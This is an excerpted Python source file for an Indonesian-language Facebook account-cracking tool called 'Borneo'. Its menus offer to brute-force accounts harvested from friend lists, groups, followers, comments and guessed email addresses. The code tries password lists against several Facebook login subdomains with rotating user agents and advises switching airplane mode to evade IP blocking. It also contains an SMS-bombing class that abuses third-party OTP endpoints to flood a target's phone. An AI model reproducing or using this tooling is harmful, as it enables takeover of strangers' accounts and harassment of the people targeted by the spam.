...
from concurrent.futures import ThreadPoolExecutor as borneonnXD 
...
try:
	...
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mBorneo')
...
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold #157DEC]
███████████████████████████████████                   
█▄─▄─▀██▀▄─██─▄▄─█─▄─▄─█▄─▄▄─█▄─▄─▀█                
██─▄─▀██─▀─██─██─███─████─▄████─▄─▀█                    
▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▀▀▄▄▄▄▀▀
                                                                        
                          COUNTRY :[bold red] 𝑰𝑵𝑫𝑶𝑵𝑬𝑺𝑰𝑨[bold white] 𝑪𝑰𝑻𝒀 𝑨𝑹𝑴𝒀                                                                                                  """,width=100,padding=(0,8),title=f"[bold green]𝑩𝒂𝒏𝒏𝒆𝒓",style=f"#0099FF"))

#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
	cetak(panel(f"[bold white]Laporkan Bila Ada Bug Jangn Malu Malu, Dan Supaya Saya Bisa Memper Baiki Secript Ini",width=100,title=f"[bold green]Melapor",padding=(0,2),style=f"#0099FF"))
	
	cetak(panel(f"[bold white][[#0099FF]01[bold white]] Login Menggunakan Cookie              [[#0099FF]03[bold white]] Cara Mendapatkan Cookie [[#0099FF]05[bold white]] Hubungi Admin \n[[#0099FF]02[bold white]] Menu Crack Tanpa Login                [[#0099FF]04[bold white]] Cek Hasil Crack ",width=100,title=f"[bold green]Menu Bot",padding=(0,2),style=f"#0099FF"))
	...
	if brno in ['1','01']:
		...
		os.system("xdg-open https://wa.me/+6285852481582?text=Assalammualaikum+Ini+ada+bug+bang+tolong+di+benedin+ya🙏🙏")
		time.sleep(1)
		exit()
	else:
...
def login_lagi334():
	try:
		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=100,style=f"#0099FF"))
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n [+] Login Successful Bolo")
							os.system('python Borneo.py')
							#bot
			except Exception as e:
...
def menu(my_name,my_id):
	...
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]𝑼𝒔𝒆𝒓 𝑰𝑫  : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]𝑻𝒂𝒏𝒈𝒈𝒂𝒍  : [bold green]{waktu}[/][/]\n[bold white][+[/][bold white]][/] [bold white]𝑺𝒕𝒂𝒕𝒖𝒔   : [bold green]Premium[/][/]\n[bold white][+[/][bold white]][/] [bold white]𝑽𝒆𝒓𝒔𝒊 𝑺𝑪 : [bold green]Update 9.2[/][/] ',width=49,padding=(0,3),style=f"#0099FF"))
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]𝐂𝐨𝐮𝐧𝐭𝐫𝐲  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]𝐂𝐢𝐭𝐲     : [bold green]{asal_kota}[/]\n[bold white][+[/][bold white]][/] [bold white]𝐑𝐞𝐠𝐢𝐨𝐧   : [bold green]{asal_reg}[/][/]\n[bold white][+[/][bold white]][/] [bold white]𝐓𝐢𝐦𝐞𝐙𝐨𝐧𝐞 : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]𝐌𝐲 𝐈𝐩    : [bold green]{ip}[/][/] ',width=50,padding=(0,3),style=f"#0099FF"))
	console.print(Columns(dia))
	cetak(panel(f"[bold green]𝑿𝒑𝒖𝒔𝒉 , 𝑭𝑰𝑭𝑻𝒀 𝑭𝑰𝑭𝑻𝒀 , 𝑪𝒀𝑩𝑬𝑹 , 𝑻𝑬𝑨𝑴 , 𝑩𝑹𝑼𝑻𝒀 , 𝑴𝒖𝒏𝒊𝒇-𝑿𝑫 , 𝒀𝒖 𝒁𝒐𝒏𝒈 , 𝑳𝑷𝒀𝑿  𝑪𝑰𝑻𝒀 , 𝑩𝑹𝑿7𝑷 , 𝑰𝑴𝑻𝑿5, Brayyenn",width=100,title=f"[bold white]𝑻𝒉𝒂𝒏𝒌𝒔 𝑻𝒐",padding=(0,5),style=f"#0099FF"))
	cetak(panel(f"[bold green]Pilih Lah Sesuai Tujuan Anda, Dan Jangan Pernah Menggunakan Secript Ini Setiap Hari Karna Bisa Delete",width=100,title=f"[bold white]Saran",style=f"#0099FF"))
	cetak(panel(f"[bold white][[#0099FF]01[bold white]] Crack From Friends     [bold white][[#0099FF]06[bold white]] Crack From Username[bold white]      [[#0099FF]11[bold white]] Get Headers    \n[bold white][[#0099FF]02[bold white]] Crack From Massal      [bold white][[#0099FF]07[bold white]] Crack From Followers     [[#0099FF]12[bold white]] Spam WhatsApp      \n[bold white][[#0099FF]03[bold white]] Crack From Groups      [[#0099FF]08[bold white]] Crack From Comment       [bold white][[#0099FF]13[bold white]] Spam Sms \n[bold white][[#0099FF]04[bold white]] Crack From Email       [bold white][[#0099FF]09[bold white]] Check Opsi Checkpoint [bold white]   [[#0099FF]14[bold white]] Track Ip \n[bold white][[#0099FF]05[bold white]] Crack From Files       [bold white][[#0099FF]10[bold white]] [bold white]Check Result Crack [bold white]      [[#0099FF]15[bold white]] [bold red]Delete Cookies     ",width=100,title=f"[bold green]𝑳𝒊𝒔𝒕 𝑴𝒆𝒏𝒖",style=f"#0099FF"))
	_____borneo___city____ = input(f' [+] Pilih Menu Crack : ')
	if _____borneo___city____ in ['1','01']:
		borneo_dump()
	elif _____borneo___city____ in ['2','02']:
		dump_massal()
	elif _____borneo___city____ in ['3','03']:
		crack_group()
	elif _____borneo___city____ in ['4','04']:
		crack_email()
	elif _____borneo___city____ in ['5','05']:
		crack_file()
	elif _____borneo___city____ in ['6','06']:
		crack_nama()
	elif _____borneo___city____ in ['7','07']:
		pengikut()
	elif _____borneo___city____ in ['8','08']:
		komen()
	elif _____borneo___city____ in ['9','09']:
		file_cp()
	elif _____borneo___city____ in ['10']:
		result()
	elif _____borneo___city____ in ['11']:
		siu()
	elif _____borneo___city____ in('12'):
		spam_wa()
	elif _____borneo___city____ in('13'):
		spam_sms()
	elif _____borneo___city____ in('14'):
		lacakip()
	elif _____borneo___city____ in ['15']:
...
###---------[ CRACK DARI KOMEN ]---------- ###
def komen():
	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=100,padding=(0,4),style=f"#0099FF"))
...
#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	cetak(nel(' Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=100,padding=(0,8),style=f"#0099FF"))
...
#----------------------[ MENU CRACK LAINNYA ]----------------------#
def lainnya():
	cetak(panel(f"[[#0099FF]01[bold white]] Crack Username                   [[#0099FF]03[bold white]] Crack File \n[[#0099FF]02[bold white]] Crack Followers                  [[#0099FF]04[bold white]] Crack Email ",width=100,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold white"))
	bray = input(f' [+] Pilih Menu Crack : ')
	if bray in(''):
		print(' [+] PILIH YANG BENAR BOLO ');back()
	if bray in('1','01'):
		crack_nama()
	elif bray in('2','02'):
		pengikut()
...
def crack_nama():
	...
	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 3.000 Username",width=100,padding=(0,2),style=f"#0099FF"))
...
def crack_email():
	...
	global ok , cp
	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=100,padding=(0,5),style=f"#0099FF"))
	nama = console.input(f' [+] Masukan Nama Target : ')
	if ',' in str(nama):
		print(f" [+] Masukan Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	cetak(nel(f'Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=100,padding=(0,9),style=f"#0099FF"))
	doma = console.input(f' [+] Masukan Nama Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" [+] Masukan Domain Dengan Benar")
		time.sleep(3);exit()
	cetak(nel(f'Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=100,padding=(0,5),style=f"#0099FF"))
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[#0099FF]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[#0099FF]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[#0099FF]03[/][bold white]][/] [bold red]Kembali[/]',width=100,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
	kz = input(f' [+] Pilih : ')
	if kz in ['2','02']:
...
def borneo_dump():
	try:
		...
		exit()
	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=100,style='#0099FF'))
...
def dump_massal():
	try:
		...
		exit()
	try:
		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=100,title=f"[bold green]𝑪𝒓𝒂𝒄𝒌 𝑴𝒂𝒔𝒔𝒂𝒍",style=f"#0099FF"))
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(panel(f'[bold white][[#0099FF]01[/][bold white]][/] [bold white]Crack Idz Old Ke New [[bold red]Not Recommended[bold white]][/]\n[bold white][[#0099FF]02[/][bold white]][/] [bold white]Crack Idz New Ke Old [[bold green]Very Recommended[bold white]][/]\n[bold white][[#0099FF]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=100,padding=(0,8),title=f"[bold green]𝑺𝑬𝑻𝑻𝑰𝑵𝑮 𝑼𝑹𝑼𝑻𝑨𝑵 𝑰𝑫",style=f"#0099FF"))
	...
	if hu in ['1','01']:
		...
		exit()
	urut = []
	urut.append(panel(f'[bold white][[#0099FF]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[#0099FF]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[#0099FF]03[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=49,title=f"[bold green]𝑽𝒂𝒍𝒊𝒅𝒂𝒕𝒆",style=f"#0099FF"))
	urut.append(panel(f'[bold white][[#0099FF]04[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[#0099FF]05[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[#0099FF]06[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=50,title=f"[bold green]𝑹𝒆𝒈𝒖𝒍𝒍𝒆𝒓",style=f"#0099FF"))
	urut.append(panel(f'[bold white][[#0099FF]07[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[#0099FF]08[/][bold white]][/] [bold white]Login Site [bold green]m.alpha.facebook.com[bold white] ',width=49,title=f"[bold green]𝑨𝒍𝒑𝒉𝒂 𝑨𝒏𝒅 𝑨𝒔𝒚𝒏𝒄",style=f"#0099FF"))
	urut.append(panel(f'[bold white][[#0099FF]09[/][bold white]][/] [bold white]Login Site [bold green]x.facebook.com[bold white] [/]\n[bold white][[#0099FF]10[/][bold white]][/] [bold white]Login Site [bold green]d.facebook.com[bold white] ',width=50,title=f"[bold green]𝑶𝒍𝒅 𝑴𝒆𝒕𝒐𝒅𝒆",style=f"#0099FF"))
	...
	if hc in ['1','01']:
		...
		method.append('validate1')
	cetak(panel('''[bold white][[#0099FF]01[bold white]] [bold white]Menggunakan Password V1 [[bold green]Recommended[bold white]]
[bold white][[#0099FF]02[bold white]] [bold white]Menggunakan Password V2 [[bold green]Very Recommended[bold white]]
[bold white][[#0099FF]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='#0099FF',title='[bold green]𝑺𝒆𝒕𝒕𝒊𝒏𝒈 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅',padding=(0,8),width=100))
	...
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=100,title=f"[bold green]Setting Cek Apk",style=f"#0099FF"))
	_borneo_ = input(' [+] Pilih : ')
	if _borneo_ in ['']:
		print(' [+] PILIH YANG BENAR BOLO ')
		back()
	elif _borneo_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
		
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=100,title=f"[bold green]Cek Opsi",style=f"#0099FF"))
	_borneo_ = input(' [+] Pilih : ')
	if _borneo_ in ['']:
		print(' [+] PILIH YANG BENAR BOLO ')
		back()
	...
	cetak(panel(f'[bold green]Bila Tidak Ada Hasil Ganti User-Agent Yang Masih Fresz Seperti Samsung Infinix Dan lain-lain',width=100,title="[bold white]PEMBERITAHUAN",style=f"#0099FF"))
	
	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=100,title=f"[bold green]Setting User-Agent",style=f"#0099FF"))
...
def passwrd():
	...
	cetak(panel(f'\t[bold white]           ON/OFF MEDE TERBANG SETIAP 100 ID SUPAYA TIDAK ADA SPAM IP',width=100,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
...
def validate1(idf,pwv):
	...
	ses = requests.Session()
	prog.update(des,description=f"{h}Mobile Sedang Mencari🌍{x} [{loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]]")
	prog.advance(des) 
	for pw in pwv:
		try:
...
def validate2(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Mbasic Sedang Mencari🌍{x} [{loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def validate3(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Free Sedang Mencari🌍{x} [{loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def kontol(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Async Sedang Mencari🌍{x} [{loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
def bapi(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}M-ALPHA Sedang Mencari🌍{x} [{loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
agent = random.choice(
		[
			...
			"Mozilla/5.0 (Linux; Android 5.0; SM-G1000F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
			...
			"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G1000P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
	]
)
...
def spam_sms():
	global nomor 
	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=100,padding=(0,8),style=f"#0099FF"))
...
class sxp_sms:
	...
	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "15835100641573155574",
					"request_time": "1583510064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    ...
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=2002191100100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
	...
	def sms_otp_14(self, no):
		...
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    ...
				    "x-ktbs-request-id": "1077100c3-86e0-4872-9dfb-b9c5da9bfa13",
